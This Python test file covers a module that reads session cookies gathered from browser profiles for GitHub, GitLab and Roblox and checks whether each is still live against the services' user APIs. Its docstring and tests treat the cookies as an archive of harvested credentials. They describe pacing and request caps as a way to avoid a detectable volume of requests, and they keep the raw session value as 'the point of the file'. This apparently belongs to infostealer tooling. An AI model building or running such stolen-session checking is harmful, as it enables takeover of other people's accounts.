"""Cookie validation, tested where it is separable from the network.

The plan's ask (#6, 00:05:42) is that a row stops being a claim and becomes a verdict, and the
interesting part of that is not the happy path. What is worth pinning:

1. **``dead`` only comes from a 401.** A 403 is what a WAF, a user-agent filter and a geoblock
   all return; a 429 and a 5xx are statements about the run. Marking any of them dead drops a
   live credential out of the archive, and the copy on the machine is not coming back. This is
   the rule the whole module exists to respect, so it is tested per status rather than in prose.
2. **Expiry is free, so it is exact.** No request, no third party, no way to be wrong. Most rows
   in a real jar are this case, and a module that spent a request on them would be the volume
   tell the pacing exists to avoid.
3. **Four states, not three.** ``valid``/``dead``/``unknown`` are verdicts; a missing ``status``
   key is "never a candidate". A row that was not asked about must not read as "asked and could
   not tell", so the cap and the deadline leave rows untouched rather than marking them unknown.
4. **The same credential is one question.** A cookie copied between profiles is asked once.
5. **Nothing in the record is a credential.** ``cookie_status.json`` carries hosts, names and
   verdicts; a value that leaked into it would be a session in a text file.

Every HTTP call is stubbed through ``identity._request``, which is where pacing, the per-call
ceiling and the deadline arithmetic live — the module under test never opens a socket.
"""

from __future__ import annotations

import json
import sys
import types
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import cookies, identity  # noqa: E402

SECRET = "s3cr3t-session-value"
GITHUB = {"host": ".github.com", "name": "user_session", "value": SECRET}
GITLAB = {"host": ".gitlab.com", "name": "_gitlab_session", "value": "gl-" + SECRET}
ROBLOX = {"host": ".roblox.com", "name": ".ROBLOSECURITY", "value": "rbx-" + SECRET}


def cfg(browsers: bool = True) -> types.SimpleNamespace:
    return types.SimpleNamespace(sources=types.SimpleNamespace(browsers=browsers))


def reply(status: int = 200, error: str = "") -> identity._Reply:
    return identity._Reply(status=status, body=b"{}", error=error, headers={})


def jar(root: Path, browser: str, profile: str, rows: list[dict]) -> Path:
    target = root / "browsers" / browser / profile
    target.mkdir(parents=True, exist_ok=True)
    (target / "cookies.json").write_text(json.dumps(rows), encoding="utf-8")
    return target / "cookies.json"


def stub(monkeypatch, answer) -> list[tuple[str, dict[str, str]]]:
    """Replace the one function that leaves the process, and record what it was asked."""
    calls: list[tuple[str, dict[str, str]]] = []

    def fake(url, headers, deadline, *, method="GET", data=None):
        calls.append((url, dict(headers)))
        return answer(url, headers) if callable(answer) else answer

    monkeypatch.setattr(identity, "_request", fake)
    return calls


def read(path: Path) -> list[dict]:
    return json.loads(path.read_text(encoding="utf-8"))


def status(root: Path) -> dict:
    return json.loads((root / "accounts" / cookies.STATUS_FILE).read_text(encoding="utf-8"))


# --- the free half -----------------------------------------------------------


def test_expired_row_is_dead_and_costs_no_request(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    path = jar(
        tmp_path,
        "chrome",
        "Default",
        [{**GITHUB, "expires": "2020-01-01T00:00:00+00:00"}],
    )

    assert cookies.validate(tmp_path, cfg()) == 1

    rows = read(path)
    assert rows[0]["status"] == cookies.DEAD
    assert rows[0]["reason"] == "expired"
    assert calls == []


def test_future_expiry_does_not_make_a_row_dead(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(
        tmp_path,
        "chrome",
        "Default",
        [{**GITHUB, "expires": "2099-01-01T00:00:00+00:00"}],
    )

    assert cookies.validate(tmp_path, cfg()) == 1

    assert len(calls) == 1
    assert read(tmp_path / "browsers/chrome/Default/cookies.json")[0]["status"] == cookies.VALID


def test_an_unparseable_expiry_is_not_an_expiry(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [{**GITHUB, "expires": "not a date"}])

    cookies.validate(tmp_path, cfg())

    assert len(calls) == 1, "a bad date must not be read as a death"


def test_an_empty_value_is_not_a_credential(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [{**GITHUB, "value": "", "expires": None}])

    assert cookies.validate(tmp_path, cfg()) == 0
    assert calls == []
    assert "status" not in read(path)[0]


# --- the verdict, one status at a time ---------------------------------------


def test_a_200_makes_a_row_valid(tmp_path, monkeypatch):
    stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    assert cookies.validate(tmp_path, cfg()) == 1

    row = read(path)[0]
    assert row["status"] == cookies.VALID
    assert "reason" not in row


def test_a_401_makes_a_row_dead(tmp_path, monkeypatch):
    stub(monkeypatch, reply(401))
    path = jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    cookies.validate(tmp_path, cfg())

    row = read(path)[0]
    assert row["status"] == cookies.DEAD
    assert row["reason"] == "unauthorized"


@pytest.mark.parametrize(
    ("status", "reason"),
    [
        (403, "status_403"),
        (404, "status_404"),
        (429, "rate_limited"),
        (500, "server_error"),
        (503, "server_error"),
    ],
)
def test_only_a_401_is_a_death(tmp_path, monkeypatch, status, reason):
    stub(monkeypatch, reply(status))
    path = jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    cookies.validate(tmp_path, cfg())

    row = read(path)[0]
    assert row["status"] == cookies.UNKNOWN
    assert row["reason"] == reason


def test_a_transport_failure_is_unknown(tmp_path, monkeypatch):
    stub(monkeypatch, reply(0, "unreachable"))
    path = jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    cookies.validate(tmp_path, cfg())

    assert read(path)[0]["status"] == cookies.UNKNOWN
    assert read(path)[0]["reason"] == "unreachable"


def test_a_row_that_becomes_valid_loses_its_old_reason(tmp_path, monkeypatch):
    stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [{**GITHUB, "status": "unknown", "reason": "stale"}])

    cookies.validate(tmp_path, cfg())

    assert "reason" not in read(path)[0]


# --- what is and is not a candidate -----------------------------------------


def test_a_cookie_that_is_not_in_the_table_is_left_alone(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [{"host": ".example.com", "name": "sid", "value": "x"}])

    assert cookies.validate(tmp_path, cfg()) == 0
    assert calls == []
    assert "status" not in read(path)[0]


def test_a_known_name_on_the_wrong_host_is_not_checked(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [{**GITHUB, "host": ".example.com"}])

    assert cookies.validate(tmp_path, cfg()) == 0
    assert calls == []
    assert "status" not in read(path)[0]


@pytest.mark.parametrize("host", [".github.com", "github.com", "api.github.com", ".API.GitHub.com"])
def test_host_matching_accepts_the_shapes_a_jar_uses(tmp_path, monkeypatch, host):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [{**GITHUB, "host": host}])

    cookies.validate(tmp_path, cfg())

    assert len(calls) == 1


def test_the_request_is_the_cookie_and_nothing_else(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    cookies.validate(tmp_path, cfg())

    url, headers = calls[0]
    assert url == "https://api.github.com/user"
    assert headers["Cookie"] == f"user_session={SECRET}"
    assert headers["User-Agent"] == identity._USER_AGENT
    assert "Authorization" not in headers


def test_each_entry_uses_its_own_endpoint(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])
    jar(tmp_path, "firefox", "abc.default", [dict(GITLAB), dict(ROBLOX)])

    cookies.validate(tmp_path, cfg())

    assert [url for url, _ in calls] == [
        "https://api.github.com/user",
        "https://gitlab.com/api/v4/user",
        "https://users.roblox.com/v1/users/authenticated",
    ]


# --- budgets -----------------------------------------------------------------


def test_the_same_credential_in_two_profiles_is_one_request(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])
    second = jar(tmp_path, "chrome", "Profile 1", [dict(GITHUB)])

    assert cookies.validate(tmp_path, cfg()) == 2, "both rows carry the verdict"

    assert len(calls) == 1
    assert read(second)[0]["status"] == cookies.VALID


def test_the_request_cap_leaves_the_rest_unmarked(tmp_path, monkeypatch):
    monkeypatch.setattr(cookies, "_MAX_CHECKS", 2)
    calls = stub(monkeypatch, reply(200))
    rows = [
        {**GITHUB, "value": f"v{index}"} for index in range(5)
    ]
    path = jar(tmp_path, "chrome", "Default", rows)

    assert cookies.validate(tmp_path, cfg()) == 2
    assert len(calls) == 2

    written = read(path)
    assert [row.get("status") for row in written[:2]] == [cookies.VALID, cookies.VALID]
    assert all("status" not in row for row in written[2:])


def test_an_exhausted_deadline_refuses_before_the_first_request(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    # First call sets the deadline; every call after it reads as past it.
    ticks = iter([0.0] + [100.0] * 10)
    monkeypatch.setattr(cookies.time, "monotonic", lambda: next(ticks))

    assert cookies.validate(tmp_path, cfg()) == 0
    assert calls == []
    assert "status" not in read(path)[0]


def test_expiry_is_still_marked_when_the_budget_is_gone(tmp_path, monkeypatch):
    stub(monkeypatch, reply(200))
    path = jar(
        tmp_path,
        "chrome",
        "Default",
        [
            {**GITHUB, "expires": "2020-01-01T00:00:00+00:00"},
            {**GITHUB, "value": "other", "expires": None},
        ],
    )

    ticks = iter([0.0] + [100.0] * 10)
    monkeypatch.setattr(cookies.time, "monotonic", lambda: next(ticks))

    assert cookies.validate(tmp_path, cfg()) == 1
    written = read(path)
    assert written[0]["status"] == cookies.DEAD
    assert "status" not in written[1]


# --- the record --------------------------------------------------------------


def test_the_status_document_has_the_same_shape_as_the_token_record(tmp_path, monkeypatch):
    stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])
    jar(tmp_path, "chrome", "Profile 1", [{**GITHUB, "expires": "2020-01-01T00:00:00+00:00"}])

    cookies.validate(tmp_path, cfg())
    document = status(tmp_path)

    assert document["schema"] == 1
    assert document["counts"] == {cookies.VALID: 1, cookies.DEAD: 1, cookies.UNKNOWN: 0}
    assert document["requests"] == 1
    assert document["rows"][0] == {
        "kind": "github",
        "host": ".github.com",
        "name": "user_session",
        "status": cookies.VALID,
        "source": "browsers/chrome/Default",
    }


def test_the_record_holds_no_cookie_value(tmp_path, monkeypatch):
    stub(monkeypatch, reply(401))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB), dict(GITLAB)])

    cookies.validate(tmp_path, cfg())

    text = (tmp_path / "accounts" / cookies.STATUS_FILE).read_text(encoding="utf-8")
    assert SECRET not in text
    assert "user_session=" not in text


def test_the_collected_row_keeps_its_value(tmp_path, monkeypatch):
    """The module annotates; it does not sanitise. The value is the point of the file."""
    stub(monkeypatch, reply(200))
    path = jar(tmp_path, "chrome", "Default", [{**GITHUB, "path": "/", "secure": True}])

    cookies.validate(tmp_path, cfg())

    row = read(path)[0]
    assert row["value"] == SECRET
    assert row["path"] == "/"
    assert row["secure"] is True


# --- the run it refuses to be part of ---------------------------------------


def test_no_browser_collector_means_no_run(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    assert cookies.validate(tmp_path, cfg(browsers=False)) == 0
    assert calls == []


def test_no_jars_is_zero(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))

    assert cookies.validate(tmp_path, cfg()) == 0
    assert calls == []
    assert not (tmp_path / "accounts" / cookies.STATUS_FILE).exists()


def test_a_jar_that_is_not_a_list_is_skipped(tmp_path, monkeypatch):
    stub(monkeypatch, reply(200))
    target = tmp_path / "browsers" / "chrome" / "Default"
    target.mkdir(parents=True)
    (target / "cookies.json").write_text('{"rows": []}', encoding="utf-8")

    assert cookies.validate(tmp_path, cfg()) == 0


def test_validate_never_raises(tmp_path, monkeypatch):
    def explode(url, headers, deadline, *, method="GET", data=None):
        raise RuntimeError("stub failure")

    monkeypatch.setattr(identity, "_request", explode)
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    assert cookies.validate(tmp_path, cfg()) == 0


def test_validate_survives_a_missing_sources_attribute(tmp_path, monkeypatch):
    calls = stub(monkeypatch, reply(200))
    jar(tmp_path, "chrome", "Default", [dict(GITHUB)])

    assert cookies.validate(tmp_path, types.SimpleNamespace()) == 0
    assert calls == []
